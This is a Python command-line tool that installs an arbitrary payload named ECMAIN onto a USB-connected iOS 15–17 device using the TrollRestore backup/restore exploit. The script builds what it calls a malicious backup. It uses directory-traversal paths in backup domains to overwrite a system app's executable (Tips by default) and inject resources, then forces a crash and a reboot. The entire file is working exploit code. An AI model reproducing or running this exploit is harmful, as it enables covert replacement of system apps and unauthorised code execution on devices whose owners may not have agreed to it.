#!/usr/bin/env python3
import sys
import shutil
import click
import requests
from pathlib import Path
from packaging.version import parse as parse_version

try:
    from pymobiledevice3.exceptions import NoDeviceConnectedError, PyMobileDevice3Exception
    from pymobiledevice3.lockdown import create_using_usbmux
    from pymobiledevice3.services.diagnostics import DiagnosticsService
    from pymobiledevice3.services.installation_proxy import InstallationProxyService
    from sparserestore import backup, perform_restore
except ImportError as e:
    print(f"Error: Missing dependencies. {e}")
    print("Please install: pip3 install pymobiledevice3 requests packaging click")
    sys.exit(1)

# Default Payload Path
PAYLOAD_PATH = Path("payload/ECMAIN")

def exit(code=0):
    sys.exit(code)

@click.command()
@click.option("--payload", type=click.Path(exists=True), default=str(PAYLOAD_PATH), help="Path to ECMAIN payload")
@click.option("--app-name", default="Tips", help="Name of the system app to replace (default: Tips)")
def cli(payload, app_name) -> None:
    """
    Install ECMAIN to iOS via Backup/Restore exploit (TrollRestore).
    """
    try:
        service_provider = create_using_usbmux()
    except NoDeviceConnectedError:
        click.secho("[-] No device connected. Please connect your iOS device via USB.", fg="red")
        return

    device_name = service_provider.get_value(key="DeviceName")
    product_version = service_provider.get_value(key="ProductVersion")
    product_type = service_provider.get_value(key="ProductType")
    
    print(f"[*] Connected to: {device_name} ({product_version}) [{product_type}]")

    device_version = parse_version(product_version)
    device_build = service_provider.get_value(key="BuildVersion")
    
    # Check compatibility (iOS 15.0 - 17.0)
    if (
        device_version < parse_version("15.0")
        or device_version > parse_version("17.0")
    ):
        click.secho(f"[-] iOS {device_version} ({device_build}) is typically not supported by this exploit.", fg="yellow")
        if not click.confirm("Do you want to proceed anyway?", default=False):
            return

    # Find Target App (e.g. Tips)
    print(f"[*] Search for target app: {app_name}")
    apps_json = InstallationProxyService(service_provider).get_apps(application_type="System", calculate_sizes=False)
    
    app_path = None
    target_app_name = app_name
    
    for key, value in apps_json.items():
        if isinstance(value, dict) and "Path" in value:
            potential_path = Path(value["Path"])
            # Match by name or bundle ID could be safer, but name is what TrollRestore uses
            if potential_path.name.lower().startswith(app_name.lower()):
                app_path = potential_path
                target_app_name = app_path.name
                break
    
    if not app_path:
        click.secho(f"[-] App '{app_name}' not found. Ensure it is installed.", fg="red")
        return

    # Check removable
    if Path("/private/var/containers/Bundle/Application") not in app_path.parents:
        click.secho(f"[-] '{target_app_name}' is not in /var/containers/Bundle/Application. It might not be removable.", fg="yellow")
        # Proceed with caution? TrollRestore allows it? Not usually.
        # System apps in /Applications cannot be replaced by this method usually?
        # Wait, Tips IS in /var/containers/Bundle/Application on modern iOS? Yes.
    
    app_uuid = app_path.parent.name
    print(f"[*] Found {target_app_name} at UUID: {app_uuid}")
    
    print(f"[*] Constructing Malicious Backup...")
    
    # Reverted to TrollRestore-style Binary-Only Replacement to avoid BootLoop
    # We will assume the payload provided is the .app folder, and we extract the binary from it.
    
    payload_path_obj = Path(payload)
    binary_content = b""
    plist_content = b""
    
    if payload_path_obj.is_dir():
        # It's an .app folder, find the binary
        bin_name = payload_path_obj.stem # ECMAIN
        if payload_path_obj.name.endswith(".app"):
             bin_name = payload_path_obj.stem
        
        bin_path = payload_path_obj / bin_name
        if not bin_path.exists():
             click.secho(f"[-] Binary not found in bundle: {bin_path}", fg="red")
             return
        print(f"[*] Found binary: {bin_path}")
        with open(bin_path, "rb") as f:
            binary_content = f.read()

        # Handle Info.plist - SKIPPED to prevent BootLoop (TrollStore style)
        # We rely on the system app's original Info.plist.
        # ECMAIN must be able to launch without its own plist keys.
        print("[*] Skipping Info.plist injection to preserve system stability.")
    
    # 1.5 Scan for ALL Bundle Resources (Frameworks, Assets, Provisioning Profile, etc.)
    resource_items = []
    if payload_path_obj.is_dir():
        print(f"[*] Scanning payload bundle: {payload_path_obj}")
        for path in payload_path_obj.rglob("*"):
            if path.name == ".DS_Store":
                continue
            if path.name == "Info.plist":
                continue
            if "_CodeSignature" in str(path):
                continue
            if path.name == bin_name:
                # This is the binary, handled separately as temp_bin
                continue
                
            rel_path = path.relative_to(payload_path_obj)
            
            # Construct domain path
            domain_suffix = f"{target_app_name}/{rel_path}"
            full_domain = f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{domain_suffix}"
            
            if path.is_dir():
                resource_items.append(
                    backup.Directory("", full_domain, owner=33, group=33)
                )
            else:
                try:
                    with open(path, "rb") as f:
                        content = f.read()
                    
                    resource_items.append(
                        backup.ConcreteFile("", full_domain, owner=33, group=33, contents=content, inode=0)
                    )
                except Exception as e:
                    print(f"[-] Failed to read resource {path}: {e}")

        print(f"[*] Prepared {len(resource_items)} resource items for injection.")

    else:
        # It's a file
        print(f"[*] Payload is a file, using directly.")
        with open(payload_path_obj, "rb") as f:
            binary_content = f.read()
            
    if not binary_content:
        click.secho("[-] Payload is empty.", fg="red")
        return

    # Target Binary Name (system app executable name)
    # Tips.app -> Tips
    target_binary_name = target_app_name.split(".")[0]
    
    backup_file_list = [
            backup.Directory("", "RootDomain"),
            backup.Directory("Library", "RootDomain"),
            backup.Directory("Library/Preferences", "RootDomain"),
            
            # 1. Write our payload to temp (Binary)
            backup.ConcreteFile("Library/Preferences/temp_bin", "RootDomain", owner=33, group=33, contents=binary_content, inode=0),
            
            # 2. Directory Traversal to the App Container
            backup.Directory(
                "",
                f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{target_app_name}",
                owner=33,
                group=33,
            ),
            
            # 3. Overwrite the main executable with a Hard Link to our temp binary
            backup.ConcreteFile(
                "",
                f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{target_app_name}/{target_binary_name}",
                owner=33,
                group=33,
                contents=b"",
                inode=0,
            ),
            
            # 4. Break the hard link for binary
            backup.ConcreteFile(
                "",
                "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp_bin",
                owner=501,
                group=501,
                contents=b"",
            ),
            
            # 5. Crash to force flush
            backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""),
    ]
    
    # Insert resource items (Frameworks, Assets, etc.) before the crash file
    if resource_items:
        # insert at index -1 (before crash file)
        for item in resource_items:
             backup_file_list.insert(-1, item)

    # If we have a patched Info.plist, inject it too
    # Info.plist injection skipped.


    back = backup.Backup(files=backup_file_list)
    
    print("[*] Performing Restore (this will reboot the device)...")
    try:
        perform_restore(back, reboot=False)
    except PyMobileDevice3Exception as e:
        if "Find My" in str(e):
            click.secho("[-] Find My iPhone must be DISABLED.", fg="red")
            return
        elif "crash_on_purpose" not in str(e):
             # Some other error
             print(f"[-] Restore Error: {e}")
             return

    print("[*] Triggering Restart...")
    try:
        with DiagnosticsService(service_provider) as diagnostics_service:
            diagnostics_service.restart()
    except Exception as e:
        print(f"[*] Could not auto-restart ({e}). Please reboot manually.")

    print(f"[+] Done! Open {target_app_name} after reboot. It should be ECMAIN.")

def main():
    try:
        cli(standalone_mode=False)
    except Exception as e:
        print(f"[-] unexpected error: {e}")

if __name__ == "__main__":
    main()
